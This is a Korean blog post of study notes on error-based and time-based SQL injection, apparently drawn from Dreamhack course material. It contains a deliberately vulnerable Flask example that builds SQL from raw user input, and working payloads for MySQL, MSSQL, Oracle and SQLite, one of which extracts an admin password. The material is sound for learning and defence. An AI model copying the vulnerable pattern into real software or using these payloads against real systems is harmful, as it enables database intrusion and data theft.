---
title: Dreamhack Error & Time Based SQL Injection
date: 2022-02-23 00:03:58
tags: Dreamhack
categories: Dreamhack
---

## Summary
애플리케이션이 어떻게 동작하는지에 따라서 SQL Injection 공격 형태가 달라집니다

예를 들어 게시판 서비스에서 해당 취약점이 발생하면 게시물의 제목, 본문을 이용해 데이터베이스의 정보를 획득할 수 있습니다

이는 SQL 쿼리가 실행되는 결과를 공격자가 직접 눈으로 확인할 수 있습니다

이와 달리 쿼리 결과를 애플리케이션의 기능에서 출력하지 않는 경우도 있는데, 이러한 상황에서 공격을 수행하는 Error based SQL Injection과 Time based SQL Injection이 파생되었습니다

이들은 취약점 발생 형태는 같으나 공격 성공 여부를 어떻게 판단하느냐에 따라 명칭이 구분됩니다

이번 강의에서는 Error based SQL Injection과 Time based SQL Injection에 대해서 소개합니다

## Error based SQL Injection
Error based SQl Injection 은 임의로 에러를 발생시켜 데이터베이스 및 운영 체제의 정보를 획득하는 공격 기법입니다

Figure1 은 해당 기법을 실습하기 위한 예제 코드로 Flask 프레임워크를 사용합니다

코드를 살펴보면 디버그 모드가 활성화되어 있는 것을 확인할 수 있으며 이용자 입력값이 별다른 검사 없이 SQL 쿼리에 포함되어 SQL Injection 취약점이 발생합니다

그러나 게시물 , 알림과 같이 SQL 실행 결과를 출력하는 코드가 존재하지 않고 쿼리 실행 결과만을 판단합니다

Figure1 Error based SQLI 실습 예제

```python
from flask import Flask, request
import pymysql
app = Flask(__name__)
def getConnection():
  return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')
@app.route('/' , methods=['GET'])
def index():
  username = request.args.get('username')
  sql = "select username from users where username='%s'" %username
  conn = getConnection()
  curs = conn.cursor(pymysql.cursors.DictCursor)
  curs.execute(sql)
  rows = curs.fetchall()
  conn.close()
  if(rows):
    return "True"
  else:
    return "False"
app.run(host='0.0.0.0', port=8000, debug=True)
```

## Error based SQL Injection 공격 방법
![SQL](https://kr.object.ncloudstorage.com/dreamhack-content/page/40ba28cdbd8df9c507a1d7afbc63465a9cb5541628c54645c0e9f94280224fdc.png)

Flask 프레임워크로 개발된 애플리케이션에서 디버그 모드를 활성화하면 코드에서 오류가 발생할 때 발생원인을 출력합니다

공격자는 오류 메시지를 통해 공격에 필요한 다양한 정보를 수집하고 원하는 데이터를 획득할 수 있습니다

Figure2 는 admin 1' 쿼리를 삽입했을 때 에러 메시지가 발생한 모습입니다

에러 메시지를 살펴보면 "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘'admin''' at line 1” 라는 문장을 확인할 수 있습니다

이는 admin 1' 쿼리를 입력하면서 문법 에러 ( Syntax Error ) 가 발생하였다는 메시지입니다

에러 메시지와 같이 쿼리 실행 결과를 직접 노출하지는 않습니다
그러나 중요한 정보를 노출하는 방법들이 존재합니다

## Error based SQL Injection 공격 코드 작성
애플리케이션에서 발생하는 에러를 이용해 공격하려 한다면 문법 에러와 같이 DBMS 에서 쿼리가 실행되기 전에 발생하는 에러가 아닌 런타임 즉 쿼리가 실행되고 나서 발생하는 에러가 필요합니다

Figure3 은 MySQL 환경에서 해당 기법으로 공격할 때 많이 사용하는 쿼리와 실행 결과입니다

결과를 살펴보면 에러 메시지에 운영 체제에 대한 정보가 포함되어 있는 것을 확인할 수 있습니다

공격자는 해당 정보를 통해서 1 - day 또는 0 - day 공격을 통해 서버를 장악할 수 있습니다
해당 쿼리를 이해하려면 extractvalue 함수에 대해서 알고 있어야 합니다

Figure3 Error based SQLI 공격 예시

```SQL
SELECT extractvalue(1,concat(0x3a,version()));
/*
ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
*/
```

## extractvalue
extractvalue 함수는 첫 번째 인자로 전잘된 XML 데이터에서 두 번째 인자인 XPATH 식을 통해 데이터를 추출합니다

만약 두 번째 인자가 올바르지 않은 XPATH 식일 경우 올바르지 않은 XPATH 식이라는 에러 메시지와 함께 잘못된 식을 출력합니다

Figure4,5 는 각각 올바른 사용 예시와 올바르지 않은 예시입니다

올바른 예시를 살펴보면 XML 데이터를 전달하고 올바른 XPATH 식을 전달해 쿼리가 정상적으로 실행되는 것을 볼 수 있는 반면 올바르지 않은 XPATH 식을 전달하면 에러 메시지에 삽입한 식의 결과가 출력되는 것을 확인할 수 있습니다

되돌아가서 Figure3 쿼리를 살펴보면 XPATH 식에 삽입한 version 함수가 실행되면서 에러 메시지에 운영 체제 정보가 포함됩니다

Figure4 extractvalue 올바른 예시

```SQL
mysql> SELECT extractvalue('<a>test</a> <b>abcd</b>', '/a');
+-----------------------------------------------+
| extractvalue('<a>test</a> <b>abcd</b>', '/a') |
+-----------------------------------------------+
| test                                          |
+-----------------------------------------------+
1 row in set (0.00 sec)
```

Figure5 extractvalue 잘못된 예시

```SQL
mysql> SELECT extractvalue(1, ':abcd');
ERROR 1105 (HY000): XPATH syntax error: ':abcd'
# ":" 로 시작하면 올바르지 않은 XPATH 식
```

## extractvalue 응용
extractvalue 함수를 응용해 사용할 경우 데이터베이스의 정보를 추출할 수 있습니다

Figure6 은 서브 쿼리를 사용해 임의 테이블의 데이터를 획득한 모습입니다

Figure6 extractvalue 를 이용한 데이터베이스 정보 추출

```SQL
mysql> SELECT extractvalue(1,concat(0x3a,(SELECT password FROM users WHERE username='admin')));
ERROR 1105 (HY000): XPATH syntax error: ':Th1s_1s_admin_PASSW@rd'
```

## Error based SQLI 응용
DBMS 별로 Error based SQLI 를 통해 공격하는 방법을 소개합니다

소개하는 쿼리의 일부는 DBMS 환경에 따라 실행되지 않을 수 있습니다

### MySQL
Figure7 MySQL Error based SQLI 응용 예시 - 1

```SQL
SELECT updatexml(null,concat(0x0a,version()),null);
/*
ERROR 1105 (HY000): XPATH syntax error: '
5.7.29-0ubuntu0.16.04.1-log'
*/
```

Figure8 MySQL Error based SQLI 응용 예시 - 2

```SQL
SELECT extractvalue(1,concat(0x3a,version()));
/*
ERROR 1105 (HY000): XPATH syntax error: ':5.7.29-0ubuntu0.16.04.1-log'
*/
```

Figure9 MySQL Error based SQLI 응용 예시 - 3

```SQL
SELECT COUNT(*), CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x;
/*
ERROR 1062 (23000): Duplicate entry '5.7.29-0ubuntu0.16.04.1-log:1' for key '<group_key>'
*/
```

### MSSQL
Figure10 MSSQL Error based SQLI 응용 예시 - 1

```SQL
SELECT convert(int,@@version);
SELECT cast((SELECT @@version) as int);
/*
Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2014 - 12.0.2000.8 (Intel X86) 
	Feb 20 2014 19:20:46 
	Copyright (c) Microsoft Corporation
	Express Edition on Windows NT 6.3 <X64> (Build 9600: ) (WOW64) (Hypervisor)
' to data type int.
*/
```

### Oracle
Figure11 Oracle Error based SQLI 응용 예시 - 1

```SQL
SELECT CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1)) FROM dual;
/*
ORA-20000: Oracle Text error:
DRG-11701: thesaurus Oracle Database 18c Express Edition Release 18.0.0.0.0 - Production does not exist
ORA-06512: at "CTXSYS.DRUE", line 183
ORA-06512: at "CTXSYS.DRITHSX", line 555
ORA-06512: at line 1
*/
```

## Error based Blind SQL Injection
Error based Blind SQL Injection 은 앞서 알아봤던 Blind SQLI 와 Error based SQLI 를 동시에 활용하는 공격 기법입니다

이를 통해 임의로 에러를 발생시키고 참 / 거짓을 판단해 데이터를 추출할 수 있습니다

Error based SQLI 기법에서는 에러 메시지를 통해 출력된 데이터로 정보를 수집해 출력값에 영향을 받지만 Error based Blind SQLI 을 이용하면 에러 발생 여부만을 필요로 하기 때문에 용이하게 사용할 수 있습니다

Figure12 는 해당 기법을 이용한 예시 쿼리입니다

쿼리를 살펴보면 MySQL 의 Double 자료형 최댓값을 초과해 에러를 발생시킵니다
쿼리가 실행되면 서버가 반환하는 HTTP 상태 코드 또는 애플리케이션의 응답 차이를 통해 에러 발생 여부를 확인하고 참 / 거짓 여부를 판단할 수 있습니다

Figure12 Error based Blind SQLI 공격 예시

```SQL
mysql> select if(1=1, 9e307*2,0);
ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'
mysql> select if(1=0, 9e307*2,0);
+--------------------+
| if(1=0, 9e307*2,0) |
+--------------------+
|                  0 |
+--------------------+
1 row in set (0.00 sec)
```

## Short - circuit evaluation
로직 연산의 원리를 이용해 공격하는 방법 또한 존재합니다

예를 들어 A 와 B 라는 식이 있을 때 AND 연산자를 사용할 경우 두 식의 결과가 모두 참이 반환돼야 전체 식이 참이 됩니다

두 개의 식 중 하나라도 거짓을 반환하면 B 연산을 실행하지 않는 점을 이용해 공격할 수 있습니다

Figure13 은 연산자를 이용해 공격하는 예시 쿼리입니다

두 쿼리문의 결과를 확인해보면 처음 식이 거짓을 반환할 경우 SLEEP 함수가 실행되지 않고 처음 식이 참인 경우 SLEEP 함수가 실핼된 것을 볼 수 있습니다

Figure13 AND 연산자를 이용한 공격 예시

```SQL
mysql> SELECT 0 AND SLEEP(1);
+----------------+
| 0 AND SLEEP(1) |
+----------------+
|              0 |
+----------------+
1 row in set (0.00 sec)
mysql> SELECT 1 AND SLEEP(10);
+-----------------+
| 1 AND SLEEP(10) |
+-----------------+
|               0 |
+-----------------+
1 row in set (10.04 sec)
```

Figure14 는 OR 연산자를 사용한 예시 쿼리입니다

OR 연산자는 처음 식이 참이라면 뒤따라오는 식의 결과에 영향을 받지 않지 않는 점을 이용해 공격할 수 있습니다

```SQL

mysql> SELECT 1=1 or 9e307*2;
+----------------+
| 1=1 or 9e307*2 |
+----------------+
|              1 |
+----------------+
1 row in set (0.00 sec)
mysql> SELECT 1=0 or 9e307*2;
ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'
```

## Time based SQL Injection
Time based SQL Injection 은 시간 지연을 이용해 쿼리의 참 / 거짓 여부를 판단하는 공격 기법입니다

시간을 지연시키는 방법으로는 DBMS 에서 제공하는 함수 또는 시간이 많은 소요되는 연산을 수행하는 헤비 쿼리 를 사용하는 방법이 있습니다

Figure12 는 DBMS 에서 기본적으로 제공하는 sleep 함수를 사용한 예시입니다

결과를 살펴보면 IF 조건문이 참일 경우 sleep 함수가 실행되어 “1 row in set (1.00 sec)” 메시지가 출력된 것을 확인할 수 있습니다 

Figure12 sleep 사용 예시

```SQL
mysql> SELECT IF(1=1, sleep(1), 0);
/*
mysql> SELECT IF(1=1, sleep(1), 0);
+----------------------+
| IF(1=1, sleep(1), 0) |
+----------------------+
|                    0 |
+----------------------+
1 row in set (1.00 sec)
*/
mysql> SELECT IF(1=0, sleep(1), 0);
/*
mysql> SELECT IF(1=0, sleep(1), 0);
+----------------------+
| IF(1=0, sleep(1), 0) |
+----------------------+
|                    0 |
+----------------------+
1 row in set (0.00 sec)
*/
```

## Time basaed SQLI 응용
DBMS 별로 Error based SQLI 를 통해 공격하는 방법을 소개합니다

### MySQL
Figure13 sleep 함수 사용 예시

```SQL
/* SLEEP(duration) */
mysql> SELECT SLEEP(1);
+----------+
| SLEEP(1) |
+----------+
|        0 |
+----------+
1 row in set (1.00 sec)
```

Figure14 benchmark 함수 사용 예시

```SQL
/* BENCHMARK(count, expr) */
mysql> SELECT BENCHMARK(40000000,SHA1(1));
+-----------------------------+
| BENCHMARK(40000000,SHA1(1)) |
+-----------------------------+
|                           0 |
+-----------------------------+
1 row in set (10.78 sec)
```

Figure15 헤비 쿼리 사용 예시

```SQL
mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
+----------+
| heavy    |
+----------+
| 24897088 |
+----------+
1 row in set (1.41 sec)

mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B) as heavy;
+-------+
| heavy |
+-------+
| 85264 |
+-------+
1 row in set (0.01 sec)

mysql> SELECT (SELECT count(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C) as heavy;
+----------+
| heavy    |
+----------+
| 24897088 |
+----------+
1 row in set (1.38 sec)
```

### MSSQL
Figure16 WAITFOR 사용 예시

```SQL
/* waitfor delay 'time_to_pass'; */
> SELECT '' if((select 'abc')='abc') waitfor delay '0:0:1';
Execution time: 1,02 sec, rows selected: 0, rows affected: 0, absolute service time: 1,17 sec, absolute service time: 1,16 sec
```

Figure17 헤비 쿼리 사용 예시

```SQL
select (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C, information_schema.columns D, information_schema.columns E, information_schema.columns F)
/*
Execution time: 6,36 sec, rows selected: 1, rows affected: 0, absolute service time: 6,53 sec, absolute service time: 6,53 sec
*/
```

### SQLite
Figure18 헤비 쿼리 사용 예시

```SQL
/* LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) */
sqlite> .timer ON
sqlite> SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1500000000/2))));
0
Run Time: real 9.740 user 7.983349 sys 1.743972
```

* * * 

## Reference
Reference : https://dreamhack.io